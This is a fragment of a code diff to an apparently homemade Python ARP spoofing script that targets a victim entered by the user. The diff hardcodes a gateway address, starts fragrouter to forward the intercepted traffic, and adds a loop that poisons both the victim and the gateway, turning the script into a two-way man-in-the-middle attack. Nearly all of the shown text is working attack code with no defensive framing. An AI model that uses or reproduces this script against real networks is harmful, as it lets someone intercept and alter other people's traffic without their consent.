@@ -79,7 +79,6 @@ def socketsend(attacker_mac,gw_ip,victim_ip,victim_mac):
 
 	packet = eth_hdr + arp_hdr
 	rawSocket.send(packet)
-	print("send socket")
 
 def macadd(ip) :
 	a=ARP()
@@ -102,19 +101,27 @@ if __name__ == '__main__':
 	print(attackerIP)
 
 	gatewayIP= attackerIP[:-1]+str(1)
-	#gatewayIP= ("192.168.0.1")
+	gatewayIP= ("192.168.123.1")
+	print(gatewayIP)
+
 	gateway_mac= macadd(gatewayIP)
+	print(gateway_mac)
+
 	victimIP= input('victim IP: ')
+	print(victimIP)
+
 	victim_mac= macadd(victimIP)
+	print(victim_mac)
+
+
 	attackerMac=get_mac()
 	attackerMac=':'.join(("%012X" %attackerMac)[i:i + 2] for i in range(0,12,2))
-	
-	print(attackerIP)
-	print(gatewayIP)
-	print(victimIP)
 	print(attackerMac)
-	print(gateway_mac)
-	print(victim_mac)
+
+	print("ARP spoofing start")
+
+	os.system("fragrouter -B1")
 
 	while True:
 		socketsend(attackerMac,gatewayIP,victimIP,victim_mac)
+		socketsend(attackerMac, victimIP, gatewayIP, gateway_mac)
